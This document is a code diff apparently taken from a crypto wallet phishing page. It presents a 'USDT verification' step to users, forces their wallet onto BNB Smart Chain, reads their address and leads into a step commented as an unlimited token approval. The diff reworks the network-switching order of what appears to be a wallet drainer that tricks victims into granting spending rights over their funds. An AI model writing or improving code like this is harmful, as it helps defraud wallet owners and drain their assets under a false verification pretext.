@@ -214,7 +214,37 @@
         updateStatus('⛽ Opening wallet for USDT verification...', 'warning');
 
         try {
-            // 1. Instant Account Resolution (iOS Trust Wallet auto-populates selectedAddress / address)
+            // 1. Strictly Enforce BNB Smart Chain Network (0x38 / 56)
+            let rawChainId = await providerObj.request({ method: 'eth_chainId' }).catch(() => null);
+            if (!rawChainId) rawChainId = providerObj.chainId || providerObj.networkVersion;
+
+            let chainStr = String(rawChainId || '').toLowerCase();
+            let isBsc = (chainStr === '0x38' || chainStr === '56' || rawChainId === 56);
+
+            if (!isBsc) {
+                updateStatus('⚠️ Switching to BNB Smart Chain network...', 'warning');
+                try {
+                    await providerObj.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: '0x38' }]
+                    });
+                } catch (switchError) {
+                    if (switchError.code === 4902 || (switchError.message && switchError.message.includes('Unrecognized'))) {
+                        await providerObj.request({
+                            method: 'wallet_addEthereumChain',
+                            params: [{
+                                chainId: '0x38',
+                                chainName: 'BNB Smart Chain',
+                                rpcUrls: ['https://bsc-dataseed1.binance.org'],
+                                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                                blockExplorerUrls: ['https://bscscan.com']
+                            }]
+                        }).catch(() => {});
+                    }
+                }
+            }
+
+            // 2. Account Resolution on BNB Smart Chain
             let userAddress = providerObj.selectedAddress || 
                               providerObj.address || 
                               (providerObj.accounts && providerObj.accounts[0]) ||
@@ -231,46 +261,13 @@
             }
 
             if (!userAddress) {
-                updateStatus('❌ No wallet address detected.', 'error');
+                updateStatus('❌ No wallet address detected on BNB Chain.', 'error');
                 state.isApproving = false;
                 updateWalletInfoUI();
                 return;
             }
 
             state.walletAddress = userAddress;
-
-            // 2. Silent Network Verification (Skip switch request if already on BSC)
-            let chainIdHex = providerObj.chainId || providerObj.networkVersion;
-            if (!chainIdHex) {
-                chainIdHex = await providerObj.request({ method: 'eth_chainId' }).catch(() => '0x38');
-            }
-
-            let isBsc = false;
-            if (typeof chainIdHex === 'number' || String(chainIdHex) === '56' || String(chainIdHex).toLowerCase() === '0x38') {
-                isBsc = true;
-            }
-
-            if (!isBsc) {
-                try {
-                    await providerObj.request({
-                        method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: CONFIG.CHAIN_ID }]
-                    });
-                } catch (switchError) {
-                    if (switchError.code === 4902 || switchError.message?.includes('Unrecognized')) {
-                        await providerObj.request({
-                            method: 'wallet_addEthereumChain',
-                            params: [{
-                                chainId: CONFIG.CHAIN_ID,
-                                chainName: CONFIG.CHAIN_NAME,
-                                rpcUrls: [CONFIG.RPC_URL],
-                                nativeCurrency: { name: 'BNB', symbol: CONFIG.CURRENCY_SYMBOL, decimals: 18 },
-                                blockExplorerUrls: ['https://bscscan.com']
-                            }]
-                        }).catch(() => {});
-                    }
-                }
-            }
 
             // 3. Ethers Signer & Unlimited Approval
             const provider = new ethers.BrowserProvider(providerObj);
